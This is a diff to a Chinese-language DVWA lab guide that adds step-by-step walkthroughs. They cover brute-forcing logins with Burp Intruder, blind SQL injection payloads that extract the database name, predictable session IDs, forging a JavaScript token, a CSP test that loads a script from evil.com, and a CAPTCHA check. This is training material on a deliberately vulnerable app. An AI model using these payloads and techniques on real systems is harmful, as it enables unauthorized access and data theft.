@@ -47,14 +47,44 @@ password
 Login
 ```
 
-测试方法：
+测试过程：
 
-1. 输入错误密码，例如 `admin / 123456`，观察失败提示。
-2. 输入正确密码，例如 `admin / password`，观察成功提示。
-3. 在 Burp `HTTP history` 中找到登录请求。
-4. 发送到 Repeater，手动替换 `password` 参数。
-5. 使用 Intruder 做少量密码枚举演示，只选中 `password` 的值作为 payload 位置。
-6. 对比 `Response` 内容、`Content-Length`、`Welcome` 和 `incorrect`。
+```text
+进入 DVWA -> Brute Force
+-> 打开登录测试页面
+
+Username: admin
+Password: 123456
+-> 页面提示 Username and/or password incorrect.
+
+Username: admin
+Password: password
+-> 页面显示 Welcome to the password protected area admin
+
+Burp -> Proxy -> HTTP history
+-> 找到登录请求
+
+GET /vulnerabilities/brute/?username=admin&password=123456&Login=Login
+-> 这是可重放和修改的登录请求
+
+Send to Repeater
+password=123456
+-> 返回 incorrect，说明密码错误
+
+password=admin
+-> 返回 incorrect，说明密码错误
+
+password=password
+-> 返回 Welcome，说明该密码正确
+
+Send to Intruder
+password=§123456§
+Payloads: 123456, admin, password, admin123
+-> 对比 Status、Length 和 Response 内容
+
+某一行 Length 明显不同，并且 Response 中出现 Welcome
+-> 该 Payload 很可能是正确密码
+```
 
 典型请求：
 
@@ -91,15 +121,49 @@ DVWA -> SQL Injection (Blind)
 id
 ```
 
-测试方法：
+测试过程：
 
-1. 输入 `1`，确认存在用户。
-2. 输入 `999`，确认不存在用户。
-3. 输入真条件 `1' and '1'='1`。
-4. 输入假条件 `1' and '1'='2`。
-5. 根据真假响应判断盲注是否成立。
-6. 使用 `length(database())` 判断数据库名长度。
-7. 使用 `substr(database(),位置,1)` 逐字符猜数据库名。
+```text
+进入 DVWA -> SQL Injection (Blind)
+-> 打开 SQL 盲注测试页面
+
+输入 1
+-> 页面显示 User ID exists in the database.
+
+输入 999
+-> 页面显示 User ID is MISSING from the database.
+
+输入 1' and '1'='1
+-> 页面显示 User ID exists in the database.
+
+输入 1' and '1'='2
+-> 页面显示 User ID is MISSING from the database.
+
+真条件 -> exists
+假条件 -> MISSING
+-> 说明 id 参数可以影响数据库查询逻辑
+
+输入 1' and length(database())=1#
+-> 页面显示 MISSING，说明数据库名长度不是 1
+
+输入 1' and length(database())=4#
+-> 页面显示 exists，说明数据库名长度是 4
+
+输入 1' and substr(database(),1,1)='d'#
+-> 页面显示 exists，说明第 1 个字符是 d
+
+输入 1' and substr(database(),2,1)='v'#
+-> 页面显示 exists，说明第 2 个字符是 v
+
+输入 1' and substr(database(),3,1)='w'#
+-> 页面显示 exists，说明第 3 个字符是 w
+
+输入 1' and substr(database(),4,1)='a'#
+-> 页面显示 exists，说明第 4 个字符是 a
+
+d + v + w + a
+-> 拼出数据库名 dvwa
+```
 
 测试 Payload：
 
@@ -143,13 +207,36 @@ DVWA -> Weak Session IDs
 Response Header 中的 Set-Cookie
 ```
 
-测试方法：
+测试过程：
 
-1. 进入模块后点击 `Generate`。
-2. 记录生成的 Session ID。
-3. 多次点击，观察是否递增。
-4. 在 Burp Response Header 中查看 `Set-Cookie`。
-5. 判断页面显示和 Cookie 是否都存在规律。
+```text
+进入 DVWA -> Weak Session IDs
+-> 打开会话 ID 生成页面
+
+点击 Generate
+-> 页面显示 Session ID: 1
+
+再次点击 Generate
+-> 页面显示 Session ID: 2
+
+继续点击 Generate
+-> 页面显示 Session ID: 3 / 4 / 5
+
+Burp -> HTTP history -> 查看 Response Header
+-> 找到 Set-Cookie
+
+Set-Cookie: dvwaSession=1
+-> 第一次生成的 Cookie 值
+
+Set-Cookie: dvwaSession=2
+-> 第二次生成的 Cookie 值
+
+Set-Cookie: dvwaSession=3
+-> 第三次生成的 Cookie 值
+
+页面显示值和 Set-Cookie 都递增
+-> Session ID 存在明显规律，容易预测
+```
 
 成功判断：
 
@@ -183,14 +270,41 @@ token
 send
 ```
 
-测试方法：
+测试过程：
 
-1. 正常提交一次，观察 Burp 中的 POST 请求。
-2. 在 Repeater 中把 `phrase=ChangeMe` 改成 `phrase=success`，保持原 token 不变。
-3. 观察是否返回 `Invalid token`。
-4. 查看 Response 中的 JavaScript，搜索 `token`、`phrase`、`md5`、`rot13`。
-5. 找到 token 生成逻辑并计算正确值。
-6. 同时提交正确 `phrase` 和 `token`。
+```text
+进入 DVWA -> JavaScript
+-> 页面提示提交指定 phrase
+
+正常提交一次
+-> Burp 中出现 POST 请求
+
+token=8b479...
+phrase=ChangeMe
+send=Submit
+-> 这是页面自动生成的参数
+
+在 Repeater 中只改 phrase
+phrase=success
+token 保持原值不变
+-> 页面返回 Invalid token.
+
+查看 Response 中的 JavaScript
+搜索 token / phrase / md5 / rot13
+-> 找到 token 生成逻辑
+
+document.getElementById("token").value = md5(rot13(phrase));
+-> 说明 token = md5(rot13(phrase))
+
+phrase=success
+-> rot13 后为 fhpprff
+
+md5(fhpprff)
+-> 38581812b435834ebf84ebcc2c6424d6
+
+提交 token=38581812b435834ebf84ebcc2c6424d6&phrase=success&send=Submit
+-> 不再出现 Invalid token，并显示成功结果
+```
 
 关键逻辑：
 
@@ -229,15 +343,39 @@ include
 Content-Security-Policy
 ```
 
-测试方法：
+测试过程：
 
-1. 在 Burp 中查看该页面 Response Header。
-2. 找到 `Content-Security-Policy`。
-3. 记录 `script-src` 白名单。
-4. 在 `include` 中输入非白名单脚本地址。
-5. 打开浏览器 Console 观察 CSP 报错。
-6. 在 `include` 中输入白名单脚本地址。
-7. 打开 Network 观察脚本是否 200 加载。
+```text
+进入 DVWA -> CSP Bypass
+-> 打开 CSP 测试页面
+
+Burp -> HTTP history -> 查看 Response Header
+-> 找到 Content-Security-Policy
+
+Content-Security-Policy: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;
+-> 说明只允许这些来源加载脚本
+
+include=https://evil.com/test.js
+-> 提交非白名单脚本地址
+
+浏览器 Console
+-> 出现 Refused to load the script because it violates the Content Security Policy
+
+https://evil.com/test.js 被拦截
+-> CSP 对非白名单来源生效
+
+include=https://code.jquery.com/jquery-3.7.1.min.js
+-> 提交白名单脚本地址
+
+浏览器 Network
+-> 出现 jquery-3.7.1.min.js，状态码 200
+
+白名单脚本加载成功
+-> CSP 允许 code.jquery.com 来源
+
+注意：jQuery 是库文件，不会自动 alert
+-> 加载成功不一定出现弹窗
+```
 
 示例 CSP：
 
@@ -291,15 +429,42 @@ Change
 配置测试 key 后，页面看到 “I'm not a robot” 表示前端验证码加载成功。
 ```
 
-测试方法：
+测试过程：
 
-1. 不勾选验证码，直接提交修改密码请求。
-2. 在 Burp 中查看 `g-recaptcha-response` 是否为空。
-3. 观察页面是否提示 `The CAPTCHA was incorrect.`。
-4. 勾选验证码，等绿色对勾出现后再次提交。
-5. 在 Burp 中找 DVWA 的 POST 请求，不要看 Google 的 `/recaptcha/api2` 请求。
-6. 查看请求底部参数，确认 `g-recaptcha-response` 是否出现一大长串值。
-7. 观察 Response 中是否有 `step`、`passed_captcha`、`Password Changed`、`incorrect`。
+```text
+进入 DVWA -> Insecure CAPTCHA
+-> 打开验证码改密页面
+
+New password: 123456
+Confirm new password: 123456
+不勾选验证码，直接点击 Change
+-> 页面提示 The CAPTCHA was incorrect.
+
+Burp 中查看 DVWA 的 POST 请求
+g-recaptcha-response=
+-> 验证码响应为空，说明没有通过验证码
+
+回到页面勾选 I'm not a robot
+-> 等待绿色对勾出现
+
+再次点击 Change
+-> Burp 中出现新的 DVWA POST 请求
+
+注意：不要看 Google 的 /recaptcha/api2 请求
+-> 要看 POST /vulnerabilities/captcha/
+
+g-recaptcha-response=03AFcWeA5...
+-> 验证码前端通过，请求里出现一大长串响应值
+
+Response 中仍然出现 The CAPTCHA was incorrect.
+-> 可能是后端校验失败、容器无法访问 Google、镜像兼容问题或流程未完成
+
+Response 中出现 Password Changed
+-> 后端接受验证码，密码修改成功
+
+Response 中出现 step / passed_captcha
+-> 可能存在两步流程，需要继续观察第二步请求
+```
 
 成功判断：
 
